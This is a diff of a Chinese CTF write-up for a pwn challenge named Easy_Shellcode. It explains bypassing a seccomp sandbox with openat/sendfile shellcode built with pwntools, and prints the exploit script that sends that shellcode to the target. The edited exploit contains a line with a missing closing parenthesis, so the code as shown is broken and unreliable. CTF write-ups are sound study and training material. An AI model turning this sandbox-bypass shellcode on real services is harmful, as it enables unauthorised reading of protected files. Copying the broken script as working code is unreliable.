@@ -632,7 +632,7 @@ p.interactive()
 ```
 ![[Pasted image 20241013115334.png]]
 ### Easy_Shellcode(复现)
-#### 做题时思路
+#### 比赛时思路
 虽然这题没做出来，但感觉我的思路应该没错，应该是构造shellcode的水平实在不行。
 ![[Pasted image 20241013115859.png]]
 可以看到仅打开了NX保护
@@ -644,7 +644,7 @@ orw指的是open,read和write，有由于sandbox限制了一些系统调用，�
 在实际操作的过程中遇到的问题是我构造的shellcode并不能将我自己构造的flag读入到指定的位置上，并未能解决
 #### 复现部分
 上面的大致思路没有错，只是本题只是禁止了`write`，还有`writev`，`sendfile`这两可以用，不需要采用侧信道爆破的方法来做。
-以及本题需要手动恢复`rsp`寄存器，恢复之后就可以用`shellcraft`来构造
+以及本题需要手动恢复`rsp`寄存器，恢复之后就可以用`shellcraft`来构造，不用苦哈哈的自己写还写不对。
 exp:
 ```python
 from pwn import *
@@ -663,14 +663,9 @@ rsp = '''
 '''
 shellcode = rsp
 shellcode += shellcraft.openat(-100, "./flag", 0, 0)
-shellcode += shellcraft.sendfile(1, 3, 0, 0x100)
+shellcode += shellcraft.sendfile(1, 3, 0, 0x100
 
-shellcode_2 = rsp + shellcraft.openat(-100, "./flag", 0, 0)
-shellcode_2 += shellcraft.preadv2(3, 0x4040c0, 0x100)
-shellcode_2 += shellcraft.writev(1, 0x4040c0, 0x100)
-
-# payload = asm
-payload = asm(shellcode_2)
+payload = asm(shellcode)
 p.sendlineafter(b'World!', payload)
 
 p.interactive()
@@ -678,6 +673,7 @@ p.interactive()
 ![[Pasted image 20241031090010.png]]
 复现的时候没有环境了，这个flag是我自己编写的。
 ### One_Last_B1te(复现)
+
 # Week 4
 ## PWN
 ### Maze_Rust
